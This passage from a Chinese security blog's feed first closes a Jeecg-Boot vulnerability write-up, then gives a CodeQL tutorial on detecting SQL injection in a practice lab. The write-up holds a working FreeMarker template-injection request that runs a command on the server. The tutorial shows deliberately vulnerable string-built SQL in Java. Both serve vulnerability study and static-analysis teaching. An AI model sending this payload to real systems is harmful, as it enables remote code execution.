id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecgboot/jmreport/queryFieldBySql</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3100</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.20.10.2:3100/login?redirect=/dashboard/analysis</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>103</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">&#123;&quot;sql&quot;:&quot;sekect &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="keyword">template</span>.utility.<span class="keyword">Execute</span>\&quot;?new()&gt;$&#123;ex(\&quot;calc\&quot;)&#125;&#x27;&quot;</span></span><br><span class="line"><span class="language-pgsql">&#125;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>postman 发包</p><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口对应 <code>org.jeecg.modules.jmreport.desreport.a.a#c()</code> 方法，先过了 sql 的黑名单，随后调用 <code>this.reportDbService.parseReportSql()</code> 方法。</p><p>跟进去是调用了动态代理，代理了 <code>target</code> 对象的 <code>method</code> 方法,并在执行该方法时传入 <code>argsToUse</code>参数，动调能够看到调用的是  <code>org.jeecg.modules.jmreport.desreport.service.a.i#parseReportSql</code> 方法。一路调用后来到 <code>org.jeecg.modules.jmreport.desreport.util.e#a</code> 方法；其中调用了 <code>FreeMarkerUtils.a()</code></p><p>跟进之后发现从这里开始新建了一个 Template，并加工表达式。后面就是 FreeMarker 执行表达式的过程了，这里不再赘述。</p><h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/baf4b96b3fcffa183e19b87485f5fb8388bb36ae">https://github.com/jeecgboot/jeecg-boot/commit/baf4b96b3fcffa183e19b87485f5fb8388bb36ae<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/acb48179ab00e167747fa4a3e4fd3b94c78aeda5">https://github.com/jeecgboot/jeecg-boot/commit/acb48179ab00e167747fa4a3e4fd3b94c78aeda5<i class="fas fa-external-link-alt"></i></a></p><p>看着没啥问题，是完整的修复。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Jeecg-Boot 部分历史漏洞分析&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="https://drun1baby.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
    <category term="代码审计" scheme="https://drun1baby.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 入门</title>
    <link href="https://drun1baby.github.io/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/"/>
    <id>https://drun1baby.github.io/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/</id>
    <published>2023-09-03T13:30:21.000Z</published>
    <updated>2023-09-18T01:07:10.579Z</updated>
    
    <content type="html"><![CDATA[<p>CodeQL · 真入门</p><span id="more"></span><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在自己第一遍学完 CodeQL 之后还是感觉比较生疏，于是想找点靶场练手，于是就有了这篇文章。</p><h2 id="0x02-CodeQL-基本语法"><a href="#0x02-CodeQL-基本语法" class="headerlink" title="0x02 CodeQL 基本语法"></a>0x02 CodeQL 基本语法</h2><h3 id="QL-语法"><a href="#QL-语法" class="headerlink" title="QL 语法"></a>QL 语法</h3><p>用的是这个靶场 —— <a class="link" href="https://github.com/l4yn3/micro_service_seclab/">micro_service_seclab:<i class="fas fa-external-link-alt"></i></a>，同理其实 JoyChou93 师傅之前所设计的靶场，也是可以用来做 CodeQL 练习的。</p><ul><li>添加对应 database</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create E:\Coding\CodeQL\CodeQL-Practice --language=<span class="string">&quot;java&quot;</span> --source-root=E:\Coding\CodeQL\micro_service_seclab --<span class="built_in">command</span>=<span class="string">&quot;mvn clean package -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure><p>CodeQL的核心引擎是不开源的，这个核心引擎的作用之一是帮助我们把micro-service-seclab转换成CodeQL能识别的中间层数据库。</p><p>然后我们需要编写QL查询语句来获取我们想要的数据。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/codeqlRunningProces.png" class><p>正如这张图描述的，由于CodeQL开源了所有的规则和规则库部分，所以我们能够做的就是编写符合我们业务逻辑的QL规则，然后使用CodeQL引擎去跑我们的规则，发现靶场的安全漏洞。</p><p>我们来简单地介绍一下本案例涉及到的CodeQL的基本语法。</p><p>基本语法包含3个部分。</p><table class="editor-table-container"><thead><tr><th>名称</th><th>解释</th></tr></thead><tbody><tr><td>Method</td><td>方法类，Method method 表示获取当前项目中所有的方法</td></tr><tr><td>MethodAccess</td><td>方法调用类，MethodAccess call 表示获取当前项目当中的所有方法调用</td></tr><tr><td>Parameter</td><td>参数类，Parameter 表示获取当前项目当中所有的参数</td></tr></tbody></table><p>结合 ql 的语法，我们尝试获取 <code>micro-service-seclab</code> 项目当中定义的所有方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">select method</span><br></pre></td></tr></table></figure><p>我们再通过 Method 类内置的一些方法，把结果过滤一下。比如我们获取名字为 <code>getStudent</code> 的方法名称。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;getStudent&quot;)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/getLimitedMethod.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">method.getName() <span class="comment">// 获取的是当前方法的名称</span></span><br><span class="line">method.getDeclaringType() / 获取的是当前方法所属class的名称。</span><br></pre></td></tr></table></figure><h3 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h3><p>和SQL一样，where部分的查询条件如果过长，会显得很乱。CodeQL提供一种机制可以让你把很长的查询语句封装成函数。</p><p>这个函数，就叫谓词。</p><p>比如上面的案例，我们可以写成如下，获得的结果跟上面是一样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">predicate isStudent(Method method) &#123;</span><br><span class="line">exists(|method.hasName(&quot;getStudent&quot;))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where isStudent(method)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><blockquote><p>语法解释</p></blockquote><p><code>predicate</code> 表示当前方法没有返回值。<br><code>exists</code> 子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回 <code>true or false</code>，来决定筛选出哪些数据。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/predicate.png" class><h3 id="设置-Source-和-Sink"><a href="#设置-Source-和-Sink" class="headerlink" title="设置 Source 和 Sink"></a>设置 Source 和 Sink</h3><p>什么是source和sink</p><p>在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</p><p>source 是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</p><p>sink 是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</p><p>sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</p><p>只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/sourceToSink.png" class><ul><li>设置 Source</li></ul><p>在 micro_service_seclab 中，对应的 Source 举个例子，SQL 注入的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/one&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">one</span><span class="params">(<span class="meta">@RequestParam(value = &quot;username&quot;)</span> String username)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> indexLogic.getStudent(username);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应 CodeQL 当中的 Source</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure><p><code>RemoteFlowSource</code> 类（在<code>semmle.code.java.dataflow.FlowSources</code>）中定义）表示可能由远程用户控制的数据流源，这里这段代码的传参比较简单，但其实传参如果复杂，比如是一个类的情况下，也是类似的</p><p>在下面的代码中，source就是<code>Student user</code>(user为Student类型，这个不受影响)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/object&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">objectParam</span><span class="params">(<span class="meta">@RequestBody</span> Student user)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> indexLogic.getStudent(user.getUsername());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>设置 Sink</li></ul><p>在本案例中，我们的sink应该为<code>query</code>方法(Method)的调用(MethodAccess)，所以我们设置Sink为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">exists(Method method, MethodAccess call |</span><br><span class="line">  method.hasName(<span class="string">&quot;query&quot;</span>)</span><br><span class="line">  and</span><br><span class="line">  call.getMethod() = method and</span><br><span class="line">  sink.asExpr() = call.getArgument(<span class="number">0</span>)</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：以上代码使用了exists子查询语法，格式为exists(Obj obj| somthing), 上面查询的意思为：查找一个query()方法的调用点，并把它的第一个参数设置为sink。 </p><p>在靶场系统(<code>micro-service-seclab</code>)中，sink就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbcTemplate.query(sql, ROW_MAPPER);</span><br></pre></td></tr></table></figure><p>因为我们测试的注入漏洞，当source变量流入这个方法的时候，才会发生注入漏洞！</p><h3 id="Flow数据流"><a href="#Flow数据流" class="headerlink" title="Flow数据流"></a>Flow数据流</h3><p>在设置完 Source 和 Sink 之后，我们需要确认 Source 到 Sink 是能够走通的，这一段的连通工作就是 CodeQL 引擎本身来完成的。我们通过 <code>config.hasFlowPath(source, sink)</code> 方法来判断是否连通。</p><p>比如如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>我们传递给 <code>config.hasFlowPath(source, sink)</code> 我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了。</p><h2 id="0x03-CodeQL-语句优化"><a href="#0x03-CodeQL-语句优化" class="headerlink" title="0x03 CodeQL 语句优化"></a>0x03 CodeQL 语句优化</h2><h3 id="初步成果"><a href="#初步成果" class="headerlink" title="初步成果"></a>初步成果</h3><p>经过整理之后的 ql 查询代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     VulConfig() &#123; this = &quot;SqlInjectionConfig&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call |</span><br><span class="line">            method.hasName(&quot;query&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/Result.png" class><p>CodeQL 在定义类上的语法和 Java 类似，其中 extends 的父类 <code>TaintTracking::Configuration</code> 是官方提供用来做数据流分析的通用类，提供很多数据流分析相关的方法，比如isSource(定义source)，isSink(定义sink)</p><p><code>src instanceof RemoteFlowSource</code> 表示src 必须是 RemoteFlowSource 类型。在RemoteFlowSource里，官方提供很非常全的source定义，我们本次用到的Springboot的Source就已经涵盖了。</p><ul><li>注：上面的注释和其它语言是不一样的，不能够删除，它是程序的一部分，因为在我们生成测试报告的时候，上面注释当中的name，description等信息会写入到审计报告中。</li></ul><h3 id="误报解决"><a href="#误报解决" class="headerlink" title="误报解决"></a>误报解决</h3><p>扫描结果当中存在一项误报</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/wubao.png" class><p>这个方法的参数类型是 <code>List&lt;Long&gt;</code>，不可能存在注入漏洞。</p><p>这说明我们的规则里，对于 <code>List&lt;Long&gt;</code> ，甚至 <code>List&lt;Integer&gt;</code> 类型都会产生误报，source 误把这种类型的参数涵盖了。</p><p>我们需要采取手段消除这种误报。</p><p>这个手段就是 <code>isSanitizer</code>。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/isSanitizer.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">isSanitizer是CodeQL的类TaintTracking::Configuration提供的净化方法。它的函数原型是：</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;&#125;</span><br><span class="line"></span><br><span class="line">在CodeQL自带的默认规则里，对当前节点是否为基础类型做了判断。</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">node.getType() instanceof PrimitiveType or</span><br><span class="line">node.getType() instanceof BoxedType or</span><br><span class="line">node.getType() instanceof NumberType</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">表示如果当前节点是上面提到的基础类型，那么此污染链将被净化阻断，漏洞将不存在。</span><br></pre></td></tr></table></figure><p>由于 CodeQL 检测SQL注入里的 <code>isSanitizer</code> 方法，只对基础类型做了判断，并没有对这种复合类型做判断，才引起了这次误报问题。</p><p>那我们只需要将这种复合类型加入到 <code>isSanitizer</code> 方法，即可消除这种误报。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or</span><br><span class="line">    node.getType() instanceof BoxedType or</span><br><span class="line">    node.getType() instanceof NumberType or</span><br><span class="line">    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )  // 这里的 ParameterizedType 代表所有泛型，判断泛型当中的传参是否为 Number 型</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以上代码的意思为：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如List)时，就切断数据流，认为数据流断掉了，不会继续往下检测。  </p><p>重新执行query，我们发现，刚才那条误报已经被成功消除啦。</p><h3 id="漏报解决"><a href="#漏报解决" class="headerlink" title="漏报解决"></a>漏报解决</h3><p>我们发现，如下的SQL注入并没有被CodeQL捕捉到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">getStudentWithOptional</span><span class="params">(Optional&lt;String&gt; username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlWithOptional</span> <span class="operator">=</span> <span class="string">&quot;select * from students where username like &#x27;%&quot;</span> + username.get() + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">//String sql = &quot;select * from students where username like ?&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>漏报理论上讲是不能接受的。如果出现误报我们还可以通过人工筛选来解决，但是漏报会导致很多漏洞流经下一个环节到线上，从而产生损失。</p><p>那我们如果通过CodeQL来解决漏报问题呢？答案就是通过 <code>isAdditionalTaintStep</code> 方法。</p><p>实现原理就一句话：<strong>断了就强制给它接上。</strong></p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/isAdditionalTaintStep.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">isAdditionalTaintStep方法是CodeQL的类TaintTracking::Configuration提供的的方法，它的原型是：</span><br><span class="line"></span><br><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;&#125;</span><br><span class="line"></span><br><span class="line">它的作用是将一个可控节点</span><br><span class="line">A强制传递给另外一个节点B，那么节点B也就成了可控节点。</span><br></pre></td></tr></table></figure><p>这里由于 Optional 这种类型的使用没有在 CodeQL 的语法库里，我们需要强制让 <code>username</code> 流转到<code>username.get()</code>，这样 <code>username.get()</code> 就变得可控了。这样应该就能识别出这个注入漏洞了。</p><p><strong>完整代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// 解决 SQL 注入 QL 语句的漏保</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate isTaintedString(Expr expSrc, Expr expDest) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call, MethodAccess call1|</span><br><span class="line">        expSrc = call1.getArgument(0) and expDest = call and call.getMethod() = method</span><br><span class="line">        and method.hasName(&quot;get&quot;) and method.getDeclaringType().toString() = &quot;Optional&lt;String&gt;&quot;</span><br><span class="line">        and call1.getArgument(0).getType().toString() = &quot;Optional&lt;String&gt;&quot;</span><br><span class="line">        )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     VulConfig() &#123; this = &quot;SqlInjectionConfig&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call |</span><br><span class="line">            method.hasName(&quot;query&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)  // sink.asExpr() 是一个方法，用于将一个 sink 转换成一个表达式。这个方法通常用于在查询中使用 sink，因为查询需要将 sink 转换成表达式才能进行分析。</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">        node.getType() instanceof PrimitiveType or</span><br><span class="line">        node.getType() instanceof BoxedType or</span><br><span class="line">        node.getType() instanceof NumberType or</span><br><span class="line">        exists(ParameterizedType pt| </span><br><span class="line">            node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType</span><br><span class="line">         )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">        isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><h3 id="Lombok-插件漏报"><a href="#Lombok-插件漏报" class="headerlink" title="Lombok 插件漏报"></a>Lombok 插件漏报</h3><p>Lombok 的注解并不会直接被 CodeQL 所解析，导致其中的中间链路会“中道崩殂”，我们用以下方法来解决。</p><h4 id="解决方法-①"><a href="#解决方法-①" class="headerlink" title="解决方法 ①"></a>解决方法 ①</h4><p>使用 <code>maven-delombok</code>，在 <code>pom.xml</code> 中添加以下代码，重新编译即可。（推荐）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>target/generated-sources/delombok<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">testSourceDirectory</span>&gt;</span>target/generated-test-sources/delombok<span class="tag">&lt;/<span class="name">testSourceDirectory</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">executions</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>delombok<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>generate-sources<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">goal</span>&gt;</span>delombok<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">            <span 